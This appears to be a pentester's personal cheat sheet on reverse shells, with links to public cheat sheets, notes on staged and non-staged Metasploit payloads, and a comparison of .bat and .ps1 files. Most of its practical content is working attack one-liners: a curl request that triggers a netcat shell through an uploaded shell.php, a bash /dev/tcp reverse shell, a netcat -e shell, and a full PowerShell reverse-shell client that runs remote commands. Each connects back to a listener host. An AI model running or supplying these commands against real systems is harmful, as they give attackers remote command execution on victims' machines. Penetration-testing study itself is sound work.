
reverse shell cheat sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://highon.coffee/blog/reverse-shell-cheat-sheet/


commands with space
`curl -k -G --data-urlencode "cmd=nc -e /bin/sh 192.168.45.173 4444" https://192.168.201.45/uploads/shell.php

bash reverse shell (but won't work if there is no /dev/tcp)
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

netcat reverse shell (should support -e option)
`nc -e /bin/sh 10.0.0.1 1234

There are 2 types of payloads
1) Staged 
2) Non Staged

https://share.gemini.google/X3bg3PjmMM9K (Read this thread for more understanding)

- **Staged Payload:** Delivered in two distinct phases. A small primary stub (stager) executes first on the target machine, connects back to the handler, and then downloads the larger, fully functional payload (like a Meterpreter shell) directly into memory over the network.
    
- **Non-Staged Payload:** Self-contained and delivered as a single, monolithic block. It contains all the functionality and commands within the payload itself, meaning no secondary download occurs after initial execution.

- **`windows/meterpreter/reverse_tcp`** is a **staged** payload (indicated by the forward slash separating `meterpreter` and `reverse_tcp`).
    
- **`windows/shell_reverse_tcp`** is a **non-staged** payload (indicated by the underscore separating `shell` and `reverse_tcp`).


Running Python exploits
Use `Python2`

PowerShell OneLiner
`$client = New-Object System.Net.Sockets.TCPClient('192.168.45.240',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

## Difference between bat and ps1 file
Feature                                      `.bat` (Batch File)                     `.ps1` (PowerShell Script)             **Interpreter Engine**                        (`cmd.exe`)                         (`powershell.exe` / `pwsh.exe`)         **Data Handling**                   Plain text only                           Structured objects (.NET framework)**Double-Click Behavior**     Runs instantly by default              Opens in a text editor (for security)**System Footprint**          Extremely lightweight and fast startup               Slower initial startup   **Cross-Platform**                  Windows only                                    Windows, macOS, and Linux       **Best For**                             Simple tasks                                           Complex automation


